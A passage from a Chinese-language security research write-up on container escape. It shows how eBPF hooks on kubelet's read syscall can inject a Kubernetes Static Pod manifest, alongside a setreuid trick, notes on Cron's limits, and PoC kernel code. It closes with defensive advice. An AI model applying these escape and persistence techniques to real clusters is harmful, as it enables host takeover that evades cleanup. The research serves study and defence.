    {
        // ...
      kruid = make_kuid(ns, ruid);
      // ...
        if (ruid != (uid_t) -1) {
            new->uid = kruid;
            if (!uid_eq(old->uid, kruid) &&
                !uid_eq(old->euid, kruid) &&
                !ns_capable_setid(old->user_ns, CAP_SETUID))
                goto error;
        }
        // ...
        if (!uid_eq(new->uid, old->uid)) {
            retval = set_user(new);
            if (retval  If one or more of the real, effective or saved set user IDs was previously
> 0, and as a result of the UID changes all of these IDs have a nonzero value,
> then all capabilities are cleared from the permitted, effective, and ambient
> capability sets.
翻译过来就是当ruid、euid、suid至少有一个为0，这些id都变成非0值时，会将permitted、effective、ambient集清空。
那么c语言的实现就很简单了：
    int ret;
        if ((ret=setreuid(65535, -1)) != 0)
        {
            printf("setreuid failed: %d\n", ret);
            return 0;
        }
在加载eBPF程序之前在用户态代码前加上这些代码就能绕过限制了。
从内核5.11开始，计算eBPF内存占用使用的是 `cgroup` 来计算，一般来说内存限制会变得很宽松，就不会遇到这种问题。
## AFW 到 RCE 新方法
控制服务器程序的配置、脚本等文件的内容进行任意代码执行是渗透和漏洞挖掘中常用的手法，从“任意文件写”提升到“任意代码执行”的利用手段也层出不穷，上述我们针对业界最常用到的计划任务组件
Cron
进行利用，实现了从容器到母机的任意代码执行（逃逸）。如果从上文读到这里，读者也能意识到，在容器场景里“写文件”的方式和方法将更加灵活，也因此，历史上我们常遇到的“crontab明明写进去了，但是shell一直不来”的这类情况也会更加普遍。而且，容器和Kubernetes安全的最佳实践建议我们应该减少节点和容器内的非必要组件，容器节点会尝试不再安装和运行
Cron 进程，最终母机节点里仅运行 kubelet 进程的情况是最理想的。种种现状，促使我们重新分析了 Cron
的现有实现，也开始思考云原生时代任意文件写的利用是否有新的TIPS。
### Cron 的局限性
### 不同的 Cron 实现
最直观的问题就是：在漏洞利用的时候，我们不清楚目标服务器的 Cron 是哪一个实现。除了上述提到的 `vixie-cron`
(https://github.com/vixie/cron)，还有两种 Cron 的实现是非常普遍的：
1.busybox-cron (https://git.busybox.net/busybox/tree/?h=1_34_stable)  
2.cronie (https://github.com/cronie-crond/cronie)
不同的 cron 实现对漏洞利用的影响主要在于：
1、配置文件的路径不一致，2、配置文件的格式不一致，3、检查配置文件更新或监控新配置文件的逻辑有不一致的实现，这些都会影响黑盒或部分白盒场景的漏洞利用的稳定性。
我们把 Linux cron 计划任务能执行命令的文件简单分为了四类：
1.`* * * * * username command` 格式，/etc/crontab，/etc/cron.d/ _等路径  
2.`* * * * * command` 格式， /var/spool/cron/ 等路径  
3.`period-in-days delay-in-minutes job-identifier command` 格式，/etc/anacrontab
等路径  
4.可执行脚本文件， /etc/cron.daily/_ ， /etc/cron.hourly/ _， /etc/cron.monthly/_ ，
/etc/cron.weekly/* 等路径
当然，如果是恶意程序，可能会简单粗暴的把所有路径都写一遍；但是如果是授权的红蓝对抗，如果考虑对抗和业务稳定，暴力利用显然是不现实的；更加值得注意的是，大部分情况我们挖掘到的任意文件写在利用时存在局限，例如无法对文件进行内容上的追加、无法设置文件的可执行权限、无法覆盖现有文件等等。
也有即使你暴力写入了所有配置文件， cron却没有进入加载新配置流程的情况，那就要从源码上看一下 cron 对监控新任务的实现，也就是下文我们要说到的
st_mtime。
### 对 st_mtime 的依赖
在我们代码审计的所有 Cron 实现中，无一例外，察觉到文件更新的方式都是对比配置文件路径的
st_mtime。在操作系统层面，文件夹内任何文件编辑、新增、删除、修改等操作，操作系统都会更新 st_mtime。如图：
但是如上文所述中,利用 eBPF 的手法却不会促使操作系统自动更新目录的 st_mtime，所以我们需要编写 eBPF 代码 attach `stat` 的
syscall，促使 Cron 进程误以为 crontab 更新了，进而执行我们新创建的计划任务。而有更多场景无法做到伪造或更新 st_mtime，例如使用
debugfs命令 进行任意文件写利用的场景，这是一个极其危险又充满变数的利用方式，但在容器场景中却不少见，可以参考 rewrite-cgroup-devices[4] 场景和 lxcfs-rw[5] 场景。
诚然， Cron 实践中还有每个小时（60分钟）不检查 st_mtime 强制更新新任务的实现（代码如下图），但包含这个设计的实现目前运用比较广泛的仅有
busybox-cron，会使EXP变得小众且不通用；如果你发现原本已经放弃的命令执行利用，吃个饭后Shell居然过来了，可能就是这个原因。
另外一个不依赖于 st_mtime 更新且最快只有每个小时执行一次的文件是上面提到的第四类文件，目录 /etc/cron.hourly/。因为这类文件使用
run-part 触发，任务已经写入了 cron 之中，run-part 会执行目录下的所有可执行脚本，没有 st_mtime
限制；但这类文件在写入时必须赋予可执行权限，不然 run-part 不会执行漏洞利用写入的脚本。
那有没有云原生时代下更为通用且更加兼容的利用方法使我们的EXP更加“云原生”呢？
### 利用 Static Pod
利用 Static Pod 是我们在容器逃逸和远程代码执行场景找到的解决方案，他是 Kubernetes 里的一种特殊的 Pod，由节点上 kubelet
进行管理。在漏洞利用上有以下几点明显的优势：
1、 仅依赖于 kubelet
Static Pod 仅依赖 kubelet，即使 K8s 的其他组件都奔溃掉线，删除 apiserver，也不影响 Static Pod 的使用。在
Kubernetes 已经是云原生技术事实标准的现在，kubelet 几乎运行与每个容器母机节点之上。
2、 配置目录固定
Static Pod 配置文件写入路径由 kubelet config 的 staticPodPath 配置项管理，默认为
/etc/kubernetes/manifests 或 /etc/kubelet.d/，一般情况不做更改。
3、 执行间隔比 Cron 更短
通过查看 Kubernetes 的源码，我们可以发现 kubelet 会每 20 秒监控新的 POD 配置文件并运行或更新对应的 POD；由
`c.FileCheckFrequency.Duration = 20 * time.Second` 控制，虽然 Cron 的每分钟执行已经算是非常及时，但
Static Pod 显然可以让等待 shell 的时间更短暂，对比 /etc/cron.daily/ _， /etc/cron.hourly/_ ，
/etc/cron.monthly/ _， /etc/cron.weekly/_ 等目录就更不用说了。
另外，Cron 的分钟级任务也会遇到重复多次执行的问题，增加多余的动作更容易触发 IDS 和 IPS，而 Static Pod
若执行成功就不再调用，保持执行状态，仅在程序奔溃或关闭时可自动重启
4、 进程配置更灵活
Static Pod 支持 Kubernetes POD 的所有配置，等于可以运行任意配置的容器。不仅可以配置特权容器和 HostPID 使用
nscenter 直接获取容器母机权限；更可以配置不同 namespace、capabilities、cgroup、apparmor、seccomp
用于特殊的需求。
灵活的进程参数和POD配置使得 Static Pod 有更多方法对抗 IDS 和 IPS，因此也延生了很多新的对抗手法，这里就不再做过多介绍。
5、 检测新文件或文件变化的逻辑更通用
最重要的是，Static Pod 不依赖于 st_mtime 逻辑，也无需设置可执行权限，新文件检测逻辑更加通用。
    func (s *sourceFile) extractFromDir(name string) ([]*v1.Pod, error) {
        dirents, err := filepath.Glob(filepath.Join(name, "[^.]*"))
        if err != nil {
            return nil, fmt.Errorf("glob failed: %v", err)
        }
        pods := make([]*v1.Pod, 0, len(dirents))
而文件更新检测是基于 kubelet 维护的 POD Hash 表进行的，配置的更新可以很及时和确切的对 POD 容器进行重建。Static Pod
甚至包含稳定完善的奔溃重启机制，由 kubelet 维护，属于 kubelet 的默认行为无需新加配置。操作系统层的痕迹清理只需删除 Static Pod
YAML 文件即可，kubelet 会自动移除关闭运行的恶意容器。同时，对于不了解 Static Pod 的蓝队选手来说，我们需要注意的是，使用
`kubectl delete` 删除恶意容器或使用 `docker stop` 关闭容器都无法完全清除 Static Pod 的恶意进程，kubelet
会守护并重启该 Pod。
## eBPF 劫持 kubelet 进行逃逸
劫持kubelet仅需要hook `openat` 、 `read` 、 `close` 三个系统调用。hook的eBPF代码和上面hook `cron`
几乎一样，但有以下几点不同。
`bpf_get_current_pid_tgid`
获取的是内核调度线程用的pid，而kubelet是多线程程序，因此需要修改根据pid过滤系统调用为使用tgid来过滤，这里采取简单办法，直接根据程序名过滤：
    // ...
        char comm[TASK_COMM_LEN];
        bpf_get_current_comm(&comm, sizeof(comm));
        // executable is not kubelet, return
        if (memcmp(comm, TARGET_NAME, sizeof(TARGET_NAME)))
            return 0;
    // ...
yaml不支持多行注释，导致hook `read` 时，如果原始返回过长，只能将超出我们写的payload长度的部分覆盖掉，不过我们可以使用
`bpf_override_return` 来修改 `read` 的返回值，因为syscall定义都是可以进行error injection的：
    #define __SYSCALL_DEFINEx(x, name, ...)                    \
        // ...
        asmlinkage long sys##name(__MAP(x,__SC_DECL,__VA_ARGS__))    \
            __attribute__((alias(__stringify(__se_sys##name))));    \
        ALLOW_ERROR_INJECTION(sys##name, ERRNO);            \
        // ...
    #endif /* __SYSCALL_DEFINEx */
该helper需要内核开启 `CONFIG_BPF_KPROBE_OVERRIDE`
选项，并且使用了该helper会导致被hook函数不会真正执行，我们hook `read` 时需要在第二次 `read`
时返回0保证，不然kubelet第二次调用 `read` 时会读取真正的yaml文件内容。
完整的hook `read` 返回代码如下：
    SEC("kretprobe/__x64_sys_read")
    int kretprobe_sys_read(struct pt_regs *ctx)
    {
        char comm[TASK_COMM_LEN];
        bpf_get_current_comm(&comm, sizeof(comm));
        // executable is not kubelet, return
        if (memcmp(comm, TARGET_NAME, sizeof(TARGET_NAME)))
            return 0;
        if (read_buf == 0)
            return 0;
        if (written)
        {
            written = 0;
            bpf_override_return(ctx, 0);
            read_buf = 0;
            return 0;
        }
        bpf_probe_write_user(read_buf, payload, PAYLOAD_LEN);
        bpf_override_return(ctx, PAYLOAD_LEN);
        read_buf = 0;
        written = 1;
        return 0;
    }
最终效果：
### 改进
本节展示的示例仅仅是一个PoC，想获取在实战环境下更完善的exploit我们还会需要以下改进：
  * 上述示例的前提条件为知道对应yaml路径，因此在实战环境下，想写出更稳定的exploit需要先hook对应系统调用，得到 `kubelet` 相应的Static Pod配置文件路径
  * PoC的利用方式是覆盖原有的yaml文件内容，这会导致原来的Pod被删除，更可靠的方式是能实现添加Pod配置的方式，不过由于 `kubelet` 使用的是 `filepath.Glob` ，不符合pattern的文件路径都会被过滤，不能简单hook `getdent64` 系统调用来利用
## 防御措施
从根源上解决，在没有使用 `user namespace` 隔离的情况下，不要赋予容器 `CAP_SYS_ADMIN` 和 `CAP_BPF` 权限，或者
`seccomp` 限制 `bpf` 系统调用。
主动防御可以监控系统 `bpf` 调用和加载eBPF程序、map的情况，在容器内一般不会加载eBPF程序，如果成功加载，则可能存在eBPF被滥用的情况。
## Thanks
感谢腾讯蓝军 lake、小五、振宇等师傅们在成文先后的审核和帮助，是让他们赋予这篇文章更多的光彩。也感谢你读到这里，成文仓促，希望业界大师傅们多指教勘误。
### References
[1] What is eBPF: __
[2] BPF and XDP Reference Guide: __
[3] The art of writing eBPF programs: a primer.:
__
[4] rewrite-cgroup-devices: __
[5] lxcfs-rw: __
[6] CDK: an open-sourced container penetration toolkit:
__
[7] Miscellaneous eBPF Tooling: __
[8] Kernel Pwning with eBPF: a Love Story:
__
[9] Docker AppArmor default profile:
__
[10] The list of program types and supported helper functions:
__
[11] bpf: unprivileged: __
* * *